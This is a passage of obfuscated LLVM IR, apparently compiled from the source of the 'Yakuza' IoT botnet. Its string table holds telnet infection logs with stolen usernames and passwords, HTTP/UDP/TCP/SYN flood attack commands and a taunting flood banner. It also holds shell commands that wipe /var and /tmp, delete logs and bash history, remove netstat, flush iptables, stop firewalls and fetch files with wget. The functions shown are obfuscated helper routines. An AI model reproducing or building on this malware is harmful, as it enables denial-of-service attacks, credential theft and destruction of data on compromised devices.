@.str.123 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.124 = private unnamed_addr constant [84 x i8] c"[ Yakuza ] Infection Success || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.125 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.151, i32 0, i32 0)], align 16
@.str.126 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.127 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.128 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.129 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.130 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.131 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.132 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.133 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.134 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.135 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.136 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.137 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.138 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.139 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.140 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.141 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.142 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.143 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.144 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.145 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.146 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.147 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.148 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.149 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.150 = private unnamed_addr constant [13 x i8] c"YakuzaBotnet\00", align 1
@.str.151 = private unnamed_addr constant [13 x i8] c"Scarface1337\00", align 1
@.str.152 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.153 = private unnamed_addr constant [5 x i8] c"USYN\00", align 1
@.str.154 = private unnamed_addr constant [5 x i8] c"ASYN\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.156 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.157 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.158 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.159 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.161 = private unnamed_addr constant [4 x i8] c"URG\00", align 1
@.str.162 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.163 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [285 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.165 = private unnamed_addr constant [48 x i8] c"Yakuza Botnet HTTP Flood In Progress. Fuck you.\00", align 1
@.str.166 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.167 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.169 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.170 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.171 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.173 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.174 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.175 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.176 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.177 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.178 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.179 = private unnamed_addr constant [45 x i8] c"wget --no-check-certificate -q -O /tmp/null \00", align 1
@.str.180 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.181 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.182 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.183 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.184 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.185 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.186 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.187 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.189 = private unnamed_addr constant [8 x i8] c"HTTPTXT\00", align 1
@.str.190 = private unnamed_addr constant [5 x i8] c"WGET\00", align 1
@.str.191 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.192 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.193 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.194 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.195 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.196 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.199 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.201 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.202 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.203 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.197 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.198 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.204 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.205 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.206 = private unnamed_addr constant [55 x i8] c"[\1B[96mBOT JOINED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.207 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.208 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.53, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  %35 = load i32, i32* @x.1
  %36 = load i32, i32* @y.2
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* @x.1
  %44 = load i32, i32* @y.2
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.3
  %2 = load i32, i32* @y.4
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %66

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.3
  %47 = load i32, i32* @y.4
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %45
  %54 = load i32, i32* %11, align 4
  %55 = add i32 %54, 1
  store i32 %55, i32* %11, align 4
  %56 = load i32, i32* @c, align 4
  %57 = add i32 %56, 1
  store i32 %57, i32* @c, align 4
  %58 = load i32, i32* @x.3
  %59 = load i32, i32* @y.4
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart259, label %originalBB46alteredBB

originalBBpart259:                                ; preds = %originalBB46
  br label %66

; <label>:66:                                     ; preds = %originalBBpart259, %originalBBpart2
  %67 = load i32, i32* %12, align 4
  %68 = load i32, i32* %11, align 4
  %69 = sub i32 %67, %68
  %70 = load i32, i32* @rand_cmwc.i, align 4
  %71 = zext i32 %70 to i64
  %72 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %71
  store i32 %69, i32* %72, align 4
  ret i32 %69

originalBBalteredBB:                              ; preds = %originalBB, %0
  %73 = alloca i64, align 8
  %74 = alloca i64, align 8
  %75 = alloca i32, align 4
  %76 = alloca i32, align 4
  store i64 18782, i64* %74, align 8
  store i32 -2, i32* %76, align 4
  %77 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 %77, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %77, 1
  %gen2 = mul i32 %_1, 1
  %_3 = sub i32 0, %77
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 %77, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %77, 1
  %gen8 = mul i32 %_7, 1
  %78 = add i32 %77, 1
  %_9 = sub i32 %78, 4095
  %gen10 = mul i32 %_9, 4095
  %_11 = sub i32 0, %78
  %gen12 = add i32 %_11, 4095
  %_13 = sub i32 0, %78
  %gen14 = add i32 %_13, 4095
  %_15 = sub i32 0, %78
  %gen16 = add i32 %_15, 4095
  %_17 = shl i32 %78, 4095
  %_18 = shl i32 %78, 4095
  %_19 = shl i32 %78, 4095
  %79 = and i32 %78, 4095
  store i32 %79, i32* @rand_cmwc.i, align 4
  %80 = load i64, i64* %74, align 8
  %81 = load i32, i32* @rand_cmwc.i, align 4
  %82 = zext i32 %81 to i64
  %83 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = zext i32 %84 to i64
  %_20 = shl i64 %80, %85
  %_21 = sub i64 %80, %85
  %gen22 = mul i64 %_21, %85
  %_23 = sub i64 %80, %85
  %gen24 = mul i64 %_23, %85
  %86 = mul i64 %80, %85
  %87 = load i32, i32* @c, align 4
  %88 = zext i32 %87 to i64
  %_25 = sub i64 %86, %88
  %gen26 = mul i64 %_25, %88
  %_27 = sub i64 0, %86
  %gen28 = add i64 %_27, %88
  %_29 = shl i64 %86, %88
  %_30 = shl i64 %86, %88
  %_31 = shl i64 %86, %88
  %_32 = sub i64 0, %86
  %gen33 = add i64 %_32, %88
  %89 = add i64 %86, %88
  store i64 %89, i64* %73, align 8
  %90 = load i64, i64* %73, align 8
  %_34 = shl i64 %90, 32
  %_35 = sub i64 %90, 32
  %gen36 = mul i64 %_35, 32
  %_37 = sub i64 0, %90
  %gen38 = add i64 %_37, 32
  %_39 = sub i64 0, %90
  %gen40 = add i64 %_39, 32
  %91 = lshr i64 %90, 32
  %92 = trunc i64 %91 to i32
  store i32 %92, i32* @c, align 4
  %93 = load i64, i64* %73, align 8
  %94 = load i32, i32* @c, align 4
  %95 = zext i32 %94 to i64
  %_41 = sub i64 0, %93
  %gen42 = add i64 %_41, %95
  %_43 = shl i64 %93, %95
  %_44 = sub i64 0, %93
  %gen45 = add i64 %_44, %95
  %96 = add i64 %93, %95
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %75, align 4
  %98 = load i32, i32* %75, align 4
  %99 = load i32, i32* @c, align 4
  %100 = icmp ult i32 %98, %99
  br label %originalBB

originalBB46alteredBB:                            ; preds = %originalBB46, %45
  %101 = load i32, i32* %11, align 4
  %_47 = sub i32 %101, 1
  %gen48 = mul i32 %_47, 1
  %102 = add i32 %101, 1
  store i32 %102, i32* %11, align 4
  %103 = load i32, i32* @c, align 4
  %_49 = sub i32 0, %103
  %gen50 = add i32 %_49, 1
  %_51 = sub i32 %103, 1
  %gen52 = mul i32 %_51, 1
  %_53 = shl i32 %103, 1
  %_54 = sub i32 0, %103
  %gen55 = add i32 %_54, 1
  %_56 = sub i32 %103, 1
  %gen57 = mul i32 %_56, 1
  %104 = add i32 %103, 1
  store i32 %104, i32* @c, align 4
  br label %originalBB46
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8**, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8** %1, i8*** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %16 = load i32, i32* @x.5
  %17 = load i32, i32* @y.6
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %48, %originalBBpart2
  %25 = load i32, i32* @x.5
  %26 = load i32, i32* @y.6
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = load i8**, i8*** %13, align 8
  %34 = load i32, i32* %14, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %14, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8*, i8** %33, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = icmp ne i8* %38, null
  %40 = load i32, i32* @x.5
  %41 = load i32, i32* @y.6
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart28, label %originalBB1alteredBB

originalBBpart28:                                 ; preds = %originalBB1
  br i1 %39, label %48, label %49

; <label>:48:                                     ; preds = %originalBBpart28
  br label %24

; <label>:49:                                     ; preds = %originalBBpart28
  store i32 0, i32* %15, align 4
  br label %50

; <label>:50:                                     ; preds = %97, %49
  %51 = load i32, i32* @x.5
  %52 = load i32, i32* @y.6
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %50
  %59 = load i32, i32* %15, align 4
  %60 = load i32, i32* %14, align 4
  %61 = icmp slt i32 %59, %60
  %62 = load i32, i32* @x.5
  %63 = load i32, i32* @y.6
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %61, label %70, label %100

; <label>:70:                                     ; preds = %originalBBpart212
  %71 = load i32, i32* @x.5
  %72 = load i32, i32* @y.6
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %70
  %79 = load i8*, i8** %12, align 8
  %80 = load i8**, i8*** %13, align 8
  %81 = load i32, i32* %15, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8*, i8** %80, i64 %82
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %79, i8* %84)
  %86 = icmp ne i32 %85, 0
  %87 = load i32, i32* @x.5
  %88 = load i32, i32* @y.6
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %86, label %95, label %96

; <label>:95:                                     ; preds = %originalBBpart216
  store i32 1, i32* %11, align 4
  br label %101

; <label>:96:                                     ; preds = %originalBBpart216
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %15, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %15, align 4
  br label %50

; <label>:100:                                    ; preds = %originalBBpart212
  store i32 0, i32* %11, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %11, align 4
  ret i32 %102

originalBBalteredBB:                              ; preds = %originalBB, %2
  %103 = alloca i32, align 4
  %104 = alloca i8*, align 8
  %105 = alloca i8**, align 8
  %106 = alloca i32, align 4
  %107 = alloca i32, align 4
  store i8* %0, i8** %104, align 8
  store i8** %1, i8*** %105, align 8
  store i32 0, i32* %106, align 4
